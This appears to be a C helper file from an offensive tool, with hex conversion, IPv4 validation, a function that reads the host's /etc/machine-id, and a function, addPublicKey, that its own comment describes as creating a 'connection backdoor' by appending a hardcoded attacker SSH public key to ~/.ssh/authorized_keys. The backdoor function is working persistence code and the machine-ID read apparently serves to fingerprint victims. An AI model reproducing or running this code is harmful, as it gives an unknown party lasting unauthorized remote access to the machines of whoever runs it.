#include "tool.h"

#include <openssl/err.h>
#include <string.h>
#include <ctype.h>
#include <regex.h>

#define REGEX_VALIDATE_IPV4_EXPRESSION "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"

/**
 * Convert byte to hex array.
 * https://gist.github.com/stigok/1737e05ef2c02cb03e7e584a8145b77e
 * @param bytes Byte array to convert (const unsigned char *)
 * @param size Size of the byte array (const unsigned short int)
 * @return The hex array created (char *)
 */
char *byteToHex(const unsigned char *bytes, const unsigned short int size) {
    char *str = (char *) malloc(((size * 2) + 1) * sizeof(char));

    if (str == NULL)
        return NULL;

    for (unsigned int i = 0; i < size; i++)
        sprintf(&str[i * 2], "%02X", bytes[i]);

    return str;
}

/**
 * Convert hex to byte array.
 * https://programming-idioms.org/idiom/176/hex-string-to-byte-array/3653/c
 * @param hex Hex array to convert (const char *)
 * @return The byte array created (unsigned char *)
 */
unsigned char *hexToByte(const char *hex) {
    unsigned short int size = (strlen(hex) / 2);
    unsigned char *bytes = (unsigned char *) malloc(size * sizeof(unsigned char));

    if (bytes == NULL)
        return NULL;

    for (unsigned short int i = 0, j = 0; i < size; i++, j += 2)
        bytes[i] = (hex[j] % 32 + 9) % 25 * 16 + (hex[j + 1] % 32 + 9) % 25;

    return bytes;
}

/**
 * Get the machine ID of the computer running the program.
 * @return The machine id of the computer. (char *)
 * Can be NULL.
 */
char *getMachineID(void) {
    FILE *f;

    if ((f = popen("cat /etc/machine-id", "r")) == NULL)
        return NULL;

    char *machine_id = (char *) malloc((MACHINE_ID_SIZE + 1) * sizeof(char));

    if (machine_id == NULL || fgets(machine_id, MACHINE_ID_SIZE + 1, f) == NULL) {
        fclose(f);
        return NULL;
    }

    fclose(f);

    return machine_id;
}

/**
 * Add a public ssh key to the ~/.ssh/authorized_keys file to create a connection backdoor.
 * @return Success of the operation (bool)
 */
bool addPublicKey(void) {
    FILE *f;

    if ((f = popen(
            "mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys && grep -q \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG16JWYCqoh+FWxid5Bz09twgYIqu1SA97tDZyFXfxAM9cqX8AYBY1LwgS+LaIsSLa/bvblpZOzwfbt1ETgD1bv91VCIafUfiVIS27UIaJYu1JCiQV6sA4vmGDRgazO0qbEdOezwi0EyHbzOy+5z/6to1R5kABCKURfzuRoaQahNekr7NHGj2GTs8RNSC2n042ihlBpyDq2Q+oXwRUrykhKjtYtRyg/d1+oTQxmX3uoq3D+gRCAglvKXQl25gjX7zkzAsr4QYaoJBivE+8mYT5FIfyiytmMdww0ZjSAk7JiBrwQvjP6rydgtNFuvD7liDpl0G3zaWofU2Vzvr3VjVb\" ~/.ssh/authorized_keys || echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG16JWYCqoh+FWxid5Bz09twgYIqu1SA97tDZyFXfxAM9cqX8AYBY1LwgS+LaIsSLa/bvblpZOzwfbt1ETgD1bv91VCIafUfiVIS27UIaJYu1JCiQV6sA4vmGDRgazO0qbEdOezwi0EyHbzOy+5z/6to1R5kABCKURfzuRoaQahNekr7NHGj2GTs8RNSC2n042ihlBpyDq2Q+oXwRUrykhKjtYtRyg/d1+oTQxmX3uoq3D+gRCAglvKXQl25gjX7zkzAsr4QYaoJBivE+8mYT5FIfyiytmMdww0ZjSAk7JiBrwQvjP6rydgtNFuvD7liDpl0G3zaWofU2Vzvr3VjVb\" >> ~/.ssh/authorized_keys",
            "r")) == NULL)
        return false;

    fclose(f);

    return true;
}

/**
 * Check if a string is a valid IPV4 address.
 * @param ipv4_address IPV4 address to check (const char *)
 * @return True if valid, false otherwise (bool)
 */
bool isIPV4valid(const char *ipv4_address) {
    regex_t regex_validate_ipv4;

    if (regcomp(&regex_validate_ipv4, REGEX_VALIDATE_IPV4_EXPRESSION, REG_EXTENDED) != 0)
        return false;

    bool is_valid = regexec(&regex_validate_ipv4, ipv4_address, 0, NULL, 0) == 0;

    regfree(&regex_validate_ipv4);

    return is_valid;
}

/**
 * Check if a string is full of digits.
 * @param value String to check (const char *)
 * @return True if the string is full of digits, false otherwise (bool)
 */
bool isFullDigit(const char *str) {
    for (unsigned int i = 0; i < strlen(str); i++)
        if (!isdigit(str[i]))
            return false;

    return true;
}